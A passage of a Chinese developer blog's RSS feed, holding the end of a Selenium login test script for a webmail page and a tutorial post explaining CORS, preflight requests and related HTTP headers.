        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; webdriver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Firefox()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url)
        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_login_01&lt;/span&gt;(self):
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        用户名、密码为空
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;switch_to&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;frame(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x-URS-iframe&amp;#34;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_name(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_keys(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_name(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_keys(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_id(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dologin&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;click()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;switch_to&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;default_content()
        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
        name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_id(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;spnUid&amp;#39;&lt;/span&gt;)        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sanzang520@yeah.net&amp;#39;&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;登录成功&amp;#39;&lt;/span&gt;)        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;登陆失败&amp;#39;&lt;/span&gt;)    
            
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_login_02&lt;/span&gt;(self):
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        用户名正确、密码为错误
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;switch_to&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;frame(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x-URS-iframe&amp;#34;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_name(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_keys(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sanzang520&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_name(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_keys(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xxx&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_id(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dologin&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;click()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;switch_to&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;default_content()
        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
        name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_id(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;spnUid&amp;#39;&lt;/span&gt;)        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sanzang520@yeah.net&amp;#39;&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;登录成功&amp;#39;&lt;/span&gt;)        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;登陆失败&amp;#39;&lt;/span&gt;)    
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_login_03&lt;/span&gt;(self):
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        用户名、密码正确
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;switch_to&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;frame(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x-URS-iframe&amp;#34;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_name(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_keys(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sanzang520&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_name(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_keys(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xxx&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_id(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dologin&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;click()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;switch_to&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;default_content()
        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
        name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_id(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;spnUid&amp;#39;&lt;/span&gt;)        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sanzang520@yeah.net&amp;#39;&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;登录成功&amp;#39;&lt;/span&gt;)        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;登陆失败&amp;#39;&lt;/span&gt;)    
            
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tearDown&lt;/span&gt;(self):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;quit()
        
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;main()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—什么是 CORS</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-cors/</link>
        <pubDate>Mon, 30 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-cors/</guid>
        <description>&lt;h2 id=&#34;1什么是cors&#34;&gt;1.什么是CORS&lt;/h2&gt;
&lt;p&gt;CORS是一个W3C标准，全称是&amp;quot;跨域资源共享&amp;quot;，它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。&lt;/p&gt;
&lt;h2 id=&#34;2浏览器的同源安全策略&#34;&gt;2.浏览器的同源安全策略&lt;/h2&gt;
&lt;p&gt;浏览器只允许请求当前域的资源，而对其他域的资源表示不信任。那怎么才算跨域呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;请求协议http，https的不同&lt;/li&gt;
&lt;li&gt;域domain的不同&lt;/li&gt;
&lt;li&gt;端口port的不同&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3http的两种请求&#34;&gt;3.HTTP的两种请求&lt;/h2&gt;
&lt;p&gt;浏览器将CORS请求分成两类：简单请求（simple request）和 非简单请求（not-so-simple request）。只要同时满足以下两大条件，就属于简单请求。&lt;/p&gt;
&lt;p&gt;（1) 请求方法是以下三种方法之一：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HEAD&lt;/li&gt;
&lt;li&gt;GET&lt;/li&gt;
&lt;li&gt;POST&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（2）HTTP的头信息不超出以下几种字段：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Accept&lt;/li&gt;
&lt;li&gt;Accept-Language&lt;/li&gt;
&lt;li&gt;Content-Language&lt;/li&gt;
&lt;li&gt;Last-Event-ID&lt;/li&gt;
&lt;li&gt;Content-Type：只限于三个值（application/x-www-form-urlencoded、multipart/form-data、text/plain）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;凡是不同时满足上面两个条件，就属于非简单请求。浏览器对这两种请求的处理，是不一样的。&lt;/p&gt;
&lt;h2 id=&#34;4简单请求&#34;&gt;4.简单请求&lt;/h2&gt;
&lt;p&gt;对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个&lt;code&gt;Origin&lt;/code&gt;字段。下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /cors &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;http://api.bob.com&lt;/span&gt;
Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;api.alice.com&lt;/span&gt;
Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US&lt;/span&gt;
Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;keep-alive&lt;/span&gt;
User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。&lt;/p&gt;
&lt;p&gt;如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。&lt;/p&gt;
&lt;p&gt;如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /cors &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
Access-Control-Allow-Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;http://api.bob.com&lt;/span&gt;
Access-Control-Allow-Credentials&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;true&lt;/span&gt;
Access-Control-Expose-Headers&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;FooBar&lt;/span&gt;
Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html; charset=utf-8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Access-Control-Allow-Origin&lt;/strong&gt;：该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Access-Control-Allow-Credentials&lt;/strong&gt;：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Access-Control-Expose-Headers&lt;/strong&gt;：该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&amp;lsquo;FooBar&amp;rsquo;)可以返回FooBar字段的值。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;5withcredentials-属性&#34;&gt;5.withCredentials 属性&lt;/h2&gt;
&lt;p&gt;CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-HTTP&#34; data-lang=&#34;HTTP&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /cors &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
Access-Control-Allow-Credentials&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;另一方面，开发者必须在AJAX请求中打开withCredentials属性。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;withCredentials&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。&lt;/p&gt;
&lt;p&gt;需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。&lt;/p&gt;
&lt;h2 id=&#34;6复杂请求&#34;&gt;6.复杂请求&lt;/h2&gt;
&lt;p&gt;非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为&amp;quot;预检&amp;quot;请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。&lt;/p&gt;
&lt;p&gt;下面是一段浏览器的JavaScript脚本。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://api.alice.com/cors&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PUT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X-Custom-Header&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。&lt;/p&gt;
&lt;p&gt;浏览器发现，这是一个非简单请求，就自动发出一个&amp;quot;预检&amp;quot;请求，要求服务器确认可以这样请求。下面是这个&amp;quot;预检&amp;quot;请求的HTTP头信息。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;OPTIONS&lt;/span&gt; /cors &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;http://api.bob.com&lt;/span&gt;
Access-Control-Request-Method&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;PUT&lt;/span&gt;
Access-Control-Request-Headers&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;X-Custom-Header&lt;/span&gt;
Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;api.alice.com&lt;/span&gt;
Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US&lt;/span&gt;
Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;keep-alive&lt;/span&gt;
User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&amp;ldquo;预检&amp;quot;请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。&lt;/p&gt;
&lt;p&gt;除了Origin字段，&amp;ldquo;预检&amp;quot;请求的头信息包括两个特殊字段。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Access-Control-Request-Method&lt;/strong&gt;：该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Access-Control-Request-Headers&lt;/strong&gt;：该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;服务器收到&amp;quot;预检&amp;quot;请求以后，检查了Origin、Access-Control-Request-Method 和 Access-Control-Request-Headers 字段以后，确认允许跨源请求，就可以做出回应。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OK&lt;/span&gt;
Date&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mon, 01 Dec 2008 01:15:39 GMT&lt;/span&gt;
Server&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Apache/2.0.61 (Unix)&lt;/span&gt;
Access-Control-Allow-Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;http://api.bob.com&lt;/span&gt;
Access-Control-Allow-Methods&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;GET, POST, PUT&lt;/span&gt;
Access-Control-Allow-Headers&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;X-Custom-Header&lt;/span&gt;
Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html; charset=utf-8&lt;/span&gt;
